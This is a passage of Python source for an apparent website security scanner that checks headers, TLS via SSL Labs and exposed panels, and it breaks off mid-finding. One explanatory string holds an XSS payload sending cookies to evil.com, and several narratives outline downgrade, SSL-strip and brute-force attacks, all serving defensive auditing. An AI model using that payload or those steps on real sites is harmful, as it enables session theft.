"""
Direct HTTP security checks — always run regardless of Nuclei.
Each check returns a finding dict with attacker impact narrative.
SSL Labs deep TLS analysis for Cloudflare-protected and all HTTPS sites.
"""
import ssl
import socket
import json
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

TIMEOUT = 10

# Burp Suite tool info keyed by check id
BURP_INFO = {
    "ssl": {
        "tool": "Burp Suite Scanner + Proxy",
        "how": "An attacker sets up Burp Proxy to intercept HTTPS traffic. With an invalid or missing cert, the browser throws a warning — attackers on the same network can serve their own cert and read all traffic in plaintext inside Burp's HTTP history.",
        "academy_topic": "TLS / Transport Layer Security",
        "academy_path": "https://portswigger.net/web-security",
    },
    "hsts": {
        "tool": "Burp Suite Proxy (SSL Strip)",
        "how": "The attacker fires up Burp Proxy and uses the 'SSL Pass Through' or a custom match-and-replace rule to strip 'https://' from links, silently downgrading your users to plain HTTP. Without HSTS the browser accepts this. Every request is then visible in Burp's HTTP History tab — cookies, passwords, session tokens.",
        "academy_topic": "HTTP request smuggling / Transport attacks",
        "academy_path": "https://portswigger.net/web-security/request-smuggling",
    },
    "csp": {
        "tool": "Burp Suite Scanner + Repeater + DOM Invader",
        "how": "Burp's active scanner automatically flags missing CSP and attempts XSS payloads. The attacker then uses Burp Repeater to craft a payload like <script>document.location='https://evil.com?c='+document.cookie</script> — with no CSP to block it, the browser executes it and sends session cookies to the attacker. Burp's DOM Invader extension maps every injection point automatically.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "xframe": {
        "tool": "Burp Suite Clickbandit",
        "how": "Burp ships a built-in tool called Clickbandit (Burp menu → Burp Clickbandit). The attacker pastes your URL, records a click sequence (e.g. 'confirm payment'), then Clickbandit generates an HTML file that overlays your site invisibly inside an iframe. When a victim visits the attacker's page and clicks anywhere, they're actually clicking your buttons without knowing it.",
        "academy_topic": "Clickjacking",
        "academy_path": "https://portswigger.net/web-security/clickjacking",
    },
    "xcto": {
        "tool": "Burp Suite Repeater + Intruder",
        "how": "The attacker uses Burp Repeater to upload a file containing a hidden <script> tag disguised as a JPG. Without X-Content-Type-Options: nosniff the browser sniffs the content and may execute it as JavaScript. Burp's Intruder can fuzz upload endpoints automatically to find which file types are accepted.",
        "academy_topic": "File upload vulnerabilities",
        "academy_path": "https://portswigger.net/web-security/file-upload",
    },
    "referrer": {
        "tool": "Burp Suite Proxy (HTTP History)",
        "how": "The attacker sits in Burp Proxy and watches the HTTP History tab. Every time a user navigates from your site to an external resource (image, script, analytics), the full Referer header is logged — potentially leaking private URLs like /account/reset-password?token=abc123 or /admin/users/42.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
    "permissions": {
        "tool": "Burp Suite Scanner + Browser exploit",
        "how": "If the attacker manages to get JavaScript running on your page (via XSS or a compromised ad), the absence of a Permissions-Policy means that script can silently call navigator.geolocation.getCurrentPosition(), request camera access, or read the clipboard — all without any browser-level policy blocking it. Burp Scanner flags the missing header; exploitation happens in the browser.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "server_disclosure": {
        "tool": "Burp Suite Target > Site Map + Scanner",
        "how": "The attacker sends a single request through Burp Proxy and reads the Server / X-Powered-By headers in the response. They now know you're running e.g. 'Apache/2.4.49' — a version with a known path traversal CVE (CVE-2021-41773). Burp Scanner then runs targeted active checks for that exact software version.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
}

# SSL Labs deep-scan Burp info entries
BURP_TLS_OLD = {
    "tool": "Burp Suite Proxy + TLS Poodle PoC",
    "how": "The attacker forces a TLS downgrade to 1.0 or 1.1 by intercepting the ClientHello in Burp's Proxy and modifying the supported_versions field. Once on TLS 1.0/1.1 they can exploit BEAST (CBC cipher padding oracle) to decrypt session cookies byte-by-byte. In Burp Repeater the attacker replays requests with modified padding until the session token is recovered.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_WEAK_CIPHER = {
    "tool": "Burp Suite Proxy + Wireshark",
    "how": "The attacker uses Burp Proxy alongside Wireshark to capture TLS traffic and identify CBC cipher handshakes. Weak ciphers (3DES, RC4, CBC without AEAD) can be broken with a BEAST or Lucky13 attack — the attacker records thousands of encrypted blocks and uses Burp Repeater to craft block-aligned boundary requests that leak plaintext byte-by-byte.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_BEAST = {
    "tool": "Burp Suite Proxy (BEAST PoC)",
    "how": "BEAST (Browser Exploit Against SSL/TLS) targets TLS 1.0 + CBC ciphers. The attacker injects JavaScript into any same-origin resource on the victim's browser to perform a chosen-plaintext attack. They use Burp Proxy to intercept the CBC-encrypted blocks and — by controlling part of the plaintext — recover the session cookie within minutes. Modern TLS 1.2/1.3 with AEAD ciphers is immune.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_POODLE = {
    "tool": "Burp Suite Proxy (POODLE PoC)",
    "how": "POODLE (Padding Oracle On Downgraded Legacy Encryption) exploits SSLv3's CBC padding. The attacker forces a protocol downgrade through Burp's match-and-replace rules and uses a JavaScript injected in the browser to make 256 crafted requests per byte of the session cookie. With an average of 128 requests per byte, a 32-byte cookie takes ~4,096 requests — automated easily in Burp Intruder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_HEARTBLEED = {
    "tool": "Burp Suite + Heartbleed Extension",
    "how": "The attacker installs the Heartbleed Burp extension (BApp Store). One click sends a malformed heartbeat request that tricks the server into leaking up to 64KB of RAM — which may contain private keys, session tokens, plaintext passwords, or database credentials from other users' requests. No authentication required. The attack leaves no trace in access logs.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_DROWN = {
    "tool": "Burp Suite Scanner + SSLv2 PoC",
    "how": "DROWN works by using SSLv2 on any server sharing the same private key. The attacker sends specially crafted SSLv2 export cipher handshakes to the vulnerable server, which acts as a decryption oracle. Burp Scanner flags the SSLv2 exposure; the actual decryption uses cross-protocol stolen ciphertext from the TLS server — recovering session tokens from TLS connections without touching TLS at all.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_NO_HSTS_SSL = {
    "tool": "Burp Suite Proxy (SSL Strip)",
    "how": "Even if the server sends HSTS in an HTTP response, without HSTS the browser has no memory of this policy on first visit. The attacker positions Burp as a MitM on public Wi-Fi and uses a match-and-replace rule to strip 'https://' links to 'http://' before they reach the browser. The browser happily follows the downgraded link — Burp HTTP History logs every cookie and credential in plaintext.",
    "academy_topic": "HTTP request smuggling / Transport attacks",
    "academy_path": "https://portswigger.net/web-security/request-smuggling",
}
BURP_LOGJAM = {
    "tool": "Burp Suite Proxy + LogJam PoC",
    "how": "Logjam targets DHE_EXPORT key exchanges. The attacker MitMs the TLS handshake via Burp Proxy and downgrades the server to 512-bit 'export-grade' Diffie-Hellman. Using precomputed discrete log tables (feasible on commodity hardware), the attacker decrypts the session key in real time and reads the entire HTTPS session in Burp's HTTP History — effectively breaking HTTPS silently.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_FREAK = {
    "tool": "Burp Suite Proxy (FREAK Attack)",
    "how": "FREAK (Factoring RSA Export Keys) forces the server to use 512-bit RSA_EXPORT keys by intercepting the ClientHello in Burp Proxy and stripping all non-export cipher suites. The resulting 512-bit key can be factored in ~7 hours on Amazon EC2. Once factored, the attacker has the session key and can decrypt all captured TLS traffic replayed through Burp Decoder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}

# Exposed panel burp info template
BURP_PANEL = {
    "tool": "Burp Suite Intruder + Repeater",
    "how": "The attacker uses Burp Intruder to brute-force the login form with a credential wordlist (rockyou.txt or admin/admin defaults). Burp Repeater lets them manually craft requests — bypassing CSRF tokens, testing SQL injection in the username field, or replaying authenticated sessions. An exposed panel with no rate limiting can be cracked in minutes.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

CHECKS = [
    {
        "id": "hsts",
        "name": "HTTP Strict Transport Security (HSTS)",
        "category": "Transport Security",
        "severity_fail": "high",
        "header": "strict-transport-security",
        "attacker_can": "Intercept your traffic by tricking browsers into using plain HTTP instead of HTTPS — a classic downgrade or man-in-the-middle attack on public Wi-Fi.",
        "attacker_cannot": "Force your browser onto plain HTTP — all connections stay encrypted even if someone tampers with links.",
        "recommendation": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    {
        "id": "csp",
        "name": "Content Security Policy (CSP)",
        "category": "Injection Defence",
        "severity_fail": "high",
        "header": "content-security-policy",
        "attacker_can": "Inject malicious scripts into your pages (Cross-Site Scripting / XSS) and steal session cookies, credentials, or redirect users to phishing sites.",
        "attacker_cannot": "Run unauthorised scripts on your pages — the browser blocks anything not on your approved list.",
        "recommendation": "Add a Content-Security-Policy header defining trusted script/style sources.",
    },
    {
        "id": "xframe",
        "name": "Clickjacking Protection (X-Frame-Options)",
        "category": "UI Redress",
        "severity_fail": "medium",
        "header": "x-frame-options",
        "attacker_can": "Load your website invisibly inside an iframe on a malicious page and trick users into clicking buttons they can't see — stealing clicks, approving transactions, or changing settings.",
        "attacker_cannot": "Embed your site in a hidden iframe — browsers refuse to load it inside other pages.",
        "recommendation": "Add header: X-Frame-Options: DENY (or SAMEORIGIN if framing on your own domain is needed).",
    },
    {
        "id": "xcto",
        "name": "MIME-Type Sniffing Protection (X-Content-Type-Options)",
        "category": "Content Security",
        "severity_fail": "medium",
        "header": "x-content-type-options",
        "attacker_can": "Upload a file containing hidden JavaScript and trick older browsers into executing it as a script by exploiting MIME-type guessing.",
        "attacker_cannot": "Trick browsers into misinterpreting file types — content is always treated as declared.",
        "recommendation": "Add header: X-Content-Type-Options: nosniff",
    },
    {
        "id": "referrer",
        "name": "Referrer Policy",
        "category": "Privacy & Info Leakage",
        "severity_fail": "low",
        "header": "referrer-policy",
        "attacker_can": "See the full URL your users came from (including sensitive path or query parameters) by reading the Referer header your site leaks to third-party resources.",
        "attacker_cannot": "Harvest URL paths from your visitors via the Referer header — the policy controls exactly what gets shared.",
        "recommendation": "Add header: Referrer-Policy: strict-origin-when-cross-origin",
    },
    {
        "id": "permissions",
        "name": "Permissions Policy",
        "category": "Browser Feature Control",
        "severity_fail": "low",
        "header": "permissions-policy",
        "attacker_can": "Abuse browser features like camera, microphone, or geolocation if malicious code runs on your site — there are no restrictions in place to block it.",
        "attacker_cannot": "Silently access camera, microphone, or location via injected scripts — browser features are locked down by policy.",
        "recommendation": "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    {
        "id": "server_disclosure",
        "name": "Server Technology Disclosure",
        "category": "Information Leakage",
        "severity_fail": "info",
        "header": None,
        "attacker_can": "Identify exactly which web server and version you're running, then look up known exploits for that specific version to target you precisely.",
        "attacker_cannot": "Fingerprint your server stack from response headers — your technology choices stay private.",
        "recommendation": "Remove or obscure the Server and X-Powered-By headers in your web server config.",
    },
]


# Cloudflare IP ranges (updated 2024)
_CF_IP_RANGES = [
    "103.21.244.", "103.22.200.", "103.31.4.", "104.16.", "104.17.",
    "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
    "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "108.162.",
    "131.0.72.", "141.101.64.", "141.101.65.", "141.101.66.", "141.101.67.",
    "162.158.", "172.64.", "172.65.", "172.66.", "172.67.", "172.68.",
    "172.69.", "172.70.", "172.71.", "188.114.96.", "188.114.97.",
    "188.114.98.", "188.114.99.", "190.93.240.", "190.93.241.",
    "190.93.242.", "190.93.243.", "197.234.240.", "197.234.241.",
    "198.41.128.", "198.41.129.", "198.41.130.", "198.41.131.",
    "199.27.128.", "199.27.129.", "199.27.130.", "199.27.131.",
]


def _detect_cloudflare(headers: dict, hostname: str) -> dict:
    """
    Detect if the site is behind Cloudflare.
    Returns a dict with is_cloudflare bool and details.
    """
    signals = []
    score = 0

    # Header signals
    server = headers.get("server", "").lower()
    if "cloudflare" in server:
        signals.append("Server: cloudflare header present")
        score += 3
    if "cf-ray" in headers:
        signals.append(f"CF-Ray: {headers['cf-ray']}")
        score += 3
    if "cf-cache-status" in headers:
        signals.append(f"CF-Cache-Status: {headers['cf-cache-status']}")
        score += 2
    if "cf-request-id" in headers:
        signals.append("CF-Request-ID header detected")
        score += 2
    if "__cf_bm" in headers.get("set-cookie", ""):
        signals.append("Cloudflare bot management cookie (__cf_bm)")
        score += 2
    if "expect-ct" in headers and "cloudflare" in headers.get("expect-ct", "").lower():
        signals.append("Expect-CT header from Cloudflare")
        score += 1

    # DNS / IP signal
    try:
        ip = socket.gethostbyname(hostname)
        is_cf_ip = any(ip.startswith(prefix) for prefix in _CF_IP_RANGES)
        if is_cf_ip:
            signals.append(f"IP {ip} is in Cloudflare's address space")
            score += 3
        else:
            signals.append(f"IP {ip} (not a Cloudflare IP — may be direct/CDN)")
    except Exception:
        ip = "unknown"

    is_cloudflare = score >= 3

    return {
        "detected": is_cloudflare,
        "confidence": "High" if score >= 5 else "Medium" if score >= 3 else "Low",
        "signals": signals,
        "ip": ip if "ip" in dir() else "unknown",
        "note": (
            "This site is proxied through Cloudflare. Some security findings (HSTS, security headers) "
            "should be fixed in the Cloudflare Dashboard — not on the origin server. "
            "Origin server IP is hidden behind Cloudflare's network."
        ) if is_cloudflare else (
            "No Cloudflare proxy detected. This appears to be a direct connection to the origin server."
        ),
        "fix_location": "Cloudflare Dashboard (SSL/TLS → Edge Certificates and Security settings)" if is_cloudflare else "Origin web server configuration",
    }


def _fetch(url: str):
    req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        headers = {k.lower(): v for k, v in resp.headers.items()}
        return headers, resp.status, resp.url


def _check_ssl(url: str) -> dict:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base = {
        "id": "ssl",
        "name": "HTTPS / SSL Encryption",
        "category": "Transport Security",
        "burp": BURP_INFO["ssl"],
    }
    if parsed.scheme != "https":
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Intercept ALL traffic between your users and the server in plain text — passwords, session tokens, personal data — because no encryption is in use.",
                "attacker_cannot": None,
                "recommendation": "Enable HTTPS by installing a TLS certificate (free via Let's Encrypt).",
                "detail": "Site is not served over HTTPS."}
    hostname = parsed.hostname
    port = parsed.port or 443
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((hostname, port), timeout=TIMEOUT), server_hostname=hostname) as s:
            cert = s.getpeercert()
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        if days_left < 0:
            return {**base, "severity": "critical", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Trigger browser security warnings for all visitors — the certificate has expired so HTTPS trust is broken.",
                    "attacker_cannot": None,
                    "recommendation": "Renew your TLS certificate immediately.",
                    "detail": f"Certificate expired {abs(days_left)} days ago."}
        if days_left < 30:
            return {**base, "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Exploit the upcoming certificate expiry — once expired, all HTTPS trust breaks and users see security warnings.",
                    "attacker_cannot": None,
                    "recommendation": f"Renew your TLS certificate — expires in {days_left} days.",
                    "detail": f"Certificate expires in {days_left} days."}
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic in plain text — the connection is encrypted with a valid certificate.",
                "recommendation": None,
                "detail": f"Valid certificate, expires in {days_left} days."}
    except ssl.SSLCertVerificationError as e:
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Present a fake certificate — browsers warn users that the connection is not trusted.",
                "attacker_cannot": None,
                "recommendation": "Fix the SSL certificate — ensure it's from a trusted CA and matches the domain.",
                "detail": f"SSL verification failed: {e}"}
    except Exception:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic — HTTPS is in use.",
                "recommendation": None, "detail": "HTTPS in use."}


def _check_exposed_panels(base_url: str) -> list:
    paths = [
        ("/admin", "Admin Panel"),
        ("/wp-admin", "WordPress Admin"),
        ("/wp-login.php", "WordPress Login"),
        ("/administrator", "Joomla Admin"),
        ("/phpmyadmin", "phpMyAdmin"),
        ("/login", "Login Page"),
        ("/.env", "Environment Config File"),
        ("/config.php", "PHP Config File"),
        ("/server-status", "Apache Server Status"),
    ]
    findings = []
    base = base_url.rstrip("/")
    for path, label in paths:
        try:
            req = urllib.request.Request(base + path, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status == 200:
                    findings.append({
                        "id": f"exposed_{path.strip('/').replace('/', '_') or 'panel'}",
                        "name": f"Exposed {label}",
                        "category": "Exposed Panels",
                        "severity": "critical" if ".env" in path or "config" in path else "high",
                        "status": "vulnerable",
                        "matched_at": base + path,
                        "attacker_can": f"Access the {label} at {path} without any restriction — this could allow full account takeover, credential theft, or database access.",
                        "attacker_cannot": None,
                        "recommendation": f"Restrict access to {path} by IP, add authentication, or remove it if unused.",
                        "detail": f"HTTP 200 returned from {path}",
                        "burp": BURP_PANEL,
                    })
        except Exception:
            pass
    return findings


def run_http_checks(url: str) -> tuple:
    """
    Returns (findings_list, cloudflare_info_dict).
    cloudflare_info is always present — detected=False if not behind Cloudflare.
    """
    from urllib.parse import urlparse
    results = []
    results.append(_check_ssl(url))
    hostname = urlparse(url).hostname or ""

    try:
        headers, status, final_url = _fetch(url)
    except Exception as e:
        cf_info = _detect_cloudflare({}, hostname)
        results.append({
            "id": "fetch_error",
            "name": "Site Reachability",
            "category": "Connectivity",
            "severity": "critical",
            "status": "vulnerable",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": "Verify the URL is correct and the server is running.",
            "detail": f"Could not connect: {e}",
        })
        return results, cf_info

    cf_info = _detect_cloudflare(headers, hostname)

    for chk in CHECKS:
        burp = BURP_INFO.get(chk["id"])
        if chk["header"] is None:
            server = headers.get("server", "")
            xpb = headers.get("x-powered-by", "")
            if server or xpb:
                detail_parts = []
                if server: detail_parts.append(f"Server: {server}")
                if xpb: detail_parts.append(f"X-Powered-By: {xpb}")
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": chk["severity_fail"], "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": chk["attacker_can"], "attacker_cannot": None,
                    "recommendation": chk["recommendation"],
                    "detail": " | ".join(detail_parts), "burp": burp,
                })
            else:
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None, "attacker_cannot": chk["attacker_cannot"],
                    "recommendation": None,
                    "detail": "No server version headers detected.", "burp": burp,
                })
        else:
            present = chk["header"] in headers
            results.append({
                "id": chk["id"], "name": chk["name"], "category": chk["category"],
                "severity": chk["severity_fail"] if not present else "info",
                "status": "protected" if present else "vulnerable",
                "matched_at": url,
                "attacker_can": None if present else chk["attacker_can"],
                "attacker_cannot": chk["attacker_cannot"] if present else None,
                "recommendation": None if present else chk["recommendation"],
                "detail": headers.get(chk["header"], "Header not present"), "burp": burp,
            })

    results.extend(_check_exposed_panels(url))
    return results, cf_info


# ---------------------------------------------------------------------------
# SSL Labs deep TLS analysis
# ---------------------------------------------------------------------------

SSL_LABS_API = "https://api.ssllabs.com/api/v3"

def _ssl_labs_get(params: dict) -> dict:
    qs = "&".join(f"{k}={v}" for k, v in params.items())
    req = urllib.request.Request(
        f"{SSL_LABS_API}/analyze?{qs}",
        headers={"User-Agent": "CyberScan/1.0 Security Audit"},
    )
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read())


def run_ssl_labs_checks(url: str) -> list:
    """
    Query the free SSL Labs API for deep TLS analysis.
    Returns findings in the same format as run_http_checks().
    Works even on Cloudflare-protected sites because it operates at TLS level.
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.hostname
    if not hostname or parsed.scheme != "https":
        return []

    findings = []
    try:
        # Kick off scan (fromCache=on reuses recent results so we don't wait)
        data = _ssl_labs_get({"host": hostname, "fromCache": "on", "all": "done"})

        # If cache miss, start fresh and poll
        if data.get("status") == "DNS":
            data = _ssl_labs_get({"host": hostname, "startNew": "on", "all": "done"})

        attempts = 0
        while data.get("status") not in ("READY", "ERROR") and attempts < 25:
            time.sleep(8)
            data = _ssl_labs_get({"host": hostname, "all": "done"})
            attempts += 1

        if data.get("status") != "READY":
            return []

        endpoints = data.get("endpoints", [])
        if not endpoints:
            return []

        # Use the best-graded endpoint
        endpoints_sorted = sorted(endpoints, key=lambda e: e.get("grade", "Z"))
        ep = endpoints_sorted[0]
        grade = ep.get("grade", "?")
        details = ep.get("details", {})

        # ── Grade summary finding ──────────────────────────────────────────
        grade_is_bad = grade not in ("A", "A+")
        grade_attacker_can = (
            f"Exploit TLS weaknesses on this server — SSL Labs grades it '{grade}' meaning it supports "
            "deprecated protocols or weak ciphers that enable downgrade and decryption attacks."
        ) if grade_is_bad else None
        grade_attacker_cannot = (
            "Exploit TLS weaknesses — SSL Labs grades this server A or A+, meaning modern-only "
            "protocols and strong ciphers are enforced."
        ) if not grade_is_bad else None
        findings.append({
            "id": "ssl_labs_grade",
            "name": f"SSL Labs Grade: {grade}",
            "category": "TLS Deep Analysis (SSL Labs)",
            "severity": "high" if grade_is_bad else "info",
            "status": "vulnerable" if grade_is_bad else "protected",
            "matched_at": hostname,
            "attacker_can": grade_attacker_can,
            "attacker_cannot": grade_attacker_cannot,
            "recommendation": "Target an A+ grade: enable TLS 1.3 only, disable TLS 1.0/1.1, deploy HSTS, use AEAD ciphers." if grade_is_bad else None,
            "detail": f"SSL Labs assessed {hostname} and assigned grade {grade}.",
            "burp": None,
        })

        # ── TLS 1.0 / 1.1 still supported ─────────────────────────────────
        protocols = details.get("protocols", [])
        weak_proto_names = [
            f"TLS {p['version']}" for p in protocols
            if str(p.get("version", "")) in ("1.0", "1.1")
        ]
        if weak_proto_names:
            proto_str = " and ".join(weak_proto_names)
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": f"Deprecated TLS Protocol: {proto_str} Enabled",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Force your server into {proto_str} — a deprecated protocol full of known "
                    "vulnerabilities. On TLS 1.0 + CBC ciphers the attacker can execute the BEAST attack "
                    "to decrypt your users' session cookies byte-by-byte. This also caps your SSL Labs "
                    f"grade to B and may fail PCI DSS compliance audits."
                ),
                "attacker_cannot": None,
                "recommendation": f"Disable {proto_str} in your TLS configuration. Only TLS 1.2 (with AEAD ciphers) and TLS 1.3 should be enabled.",
                "detail": f"Server supports: {', '.join(weak_proto_names)}. These should be disabled.",
                "burp": BURP_TLS_OLD,
            })
        else:
            enabled = [f"TLS {p['version']}" for p in protocols]
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": "Modern TLS Protocols Only",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Force a downgrade to deprecated TLS 1.0 or 1.1 — only modern TLS versions are accepted.",
                "recommendation": None,
                "detail": f"Enabled: {', '.join(enabled)}. No deprecated protocols.",
                "burp": None,
            })

        # ── Weak cipher suites ─────────────────────────────────────────────
        suites_data = details.get("suites", [])
        weak_ciphers = []
        for suite_group in suites_data:
            for cs in suite_group.get("list", []):
                if cs.get("q") == 0:  # q=0 means WEAK in SSL Labs API
                    weak_ciphers.append(cs.get("name", "Unknown"))
        if weak_ciphers:
            sample = weak_ciphers[:3]
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": f"Weak Cipher Suites Enabled ({len(weak_ciphers)} found)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Negotiate a weak cipher suite (e.g. {sample[0]}) during the TLS handshake. "
                    "CBC-mode ciphers are vulnerable to Lucky13 and BEAST padding oracle attacks — "
                    "the attacker captures encrypted traffic and, through thousands of crafted requests, "
                    "recovers plaintext session tokens without the private key."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all CBC and 3DES cipher suites. Configure your server to use only AEAD ciphers: AES-GCM and ChaCha20-Poly1305.",
                "detail": f"Weak ciphers: {', '.join(weak_ciphers[:5])}{'...' if len(weak_ciphers) > 5 else ''}",
                "burp": BURP_WEAK_CIPHER,
            })
        else:
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": "No Weak Cipher Suites",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Negotiate a weak cipher — only strong AEAD cipher suites are offered.",
                "recommendation": None,
                "detail": "All cipher suites use strong AEAD encryption (AES-GCM / ChaCha20).",
                "burp": None,
            })

        # ── BEAST ─────────────────────────────────────────────────────────
        if details.get("vulnBeast"):
            findings.append({
                "id": "ssl_labs_beast",
                "name": "BEAST Attack — Not Mitigated",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Execute the BEAST (Browser Exploit Against SSL/TLS) attack against users on TLS 1.0. "
                    "By injecting JavaScript into any resource the victim's browser loads, the attacker "
                    "controls part of the plaintext and can decrypt session cookies byte-by-byte — "
                    "gaining full account access without knowing the password."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable TLS 1.0 entirely and prioritise TLS 1.3. If TLS 1.2 must be kept, use only GCM (AEAD) cipher suites — they are immune to BEAST.",
                "detail": "Server supports TLS 1.0 + CBC ciphers. BEAST is unmitigated server-side.",
                "burp": BURP_BEAST,
            })

        # ── POODLE ────────────────────────────────────────────────────────
        if details.get("poodle") or details.get("poodleTls") == 2:
            findings.append({
                "id": "ssl_labs_poodle",
                "name": "POODLE Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Exploit the POODLE (Padding Oracle On Downgraded Legacy Encryption) vulnerability "
                    "to decrypt HTTPS sessions. The attacker forces a downgrade to SSLv3, then uses "
                    "your browser as a padding oracle — making ~256 crafted requests per byte of your "
                    "session cookie. A typical session cookie is cracked in under 5 minutes."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv3 completely on your server. It has no safe use — TLS 1.2+ replaces it entirely.",
                "detail": "Server is vulnerable to POODLE — SSLv3 padding oracle attack confirmed.",
                "burp": BURP_POODLE,
            })

        # ── Heartbleed ────────────────────────────────────────────────────
        if details.get("heartbleed"):
            findings.append({
                "id": "ssl_labs_heartbleed",
                "name": "Heartbleed Vulnerability (CVE-2014-0160)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Read up to 64KB of your server's live RAM per request — completely unauthenticated. "
                    "This memory contains TLS private keys, session tokens, plaintext passwords from "
                    "active user sessions, database credentials, and API keys. The attacker can "
                    "impersonate your server, decrypt past and future traffic, and steal any user's "
                    "session. It leaves no trace in your access logs."
                ),
                "attacker_cannot": None,
                "recommendation": "Update OpenSSL immediately to 1.0.1g or later. Revoke and reissue all TLS certificates. Invalidate all session tokens. This is a critical emergency fix.",
                "detail": "Heartbleed (CVE-2014-0160) confirmed — OpenSSL memory leak via malformed heartbeat request.",
                "burp": BURP_HEARTBLEED,
            })

        # ── DROWN ─────────────────────────────────────────────────────────
        if details.get("drownVulnerable"):
            findings.append({
                "id": "ssl_labs_drown",
                "name": "DROWN Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Decrypt your modern TLS traffic by attacking SSLv2 on the same server (or another "
                    "server sharing the same private key). DROWN requires no access to the client — "
                    "the attacker captures TLS ciphertext, uses SSLv2 export cipher handshakes as a "
                    "decryption oracle, and recovers the session key in hours. Full HTTPS session "
                    "contents are then readable: credentials, tokens, payment data."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv2 on all servers sharing this private key. Do not reuse private keys across servers. Patch OpenSSL to remove SSLv2 support.",
                "detail": "Server is vulnerable to DROWN — SSLv2 enabled, enabling cross-protocol decryption of TLS traffic.",
                "burp": BURP_DROWN,
            })

        # ── Logjam ────────────────────────────────────────────────────────
        if details.get("logjam"):
            findings.append({
                "id": "ssl_labs_logjam",
                "name": "Logjam — Weak Diffie-Hellman Key Exchange",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Downgrade your TLS handshake to use 512-bit export-grade Diffie-Hellman. "
                    "Using precomputed discrete log tables (feasible on standard hardware for 512-bit DH), "
                    "the attacker recovers the session key in real time and reads the full HTTPS session — "
                    "silently, with no indication to the user or server."
                ),
                "attacker_cannot": None,
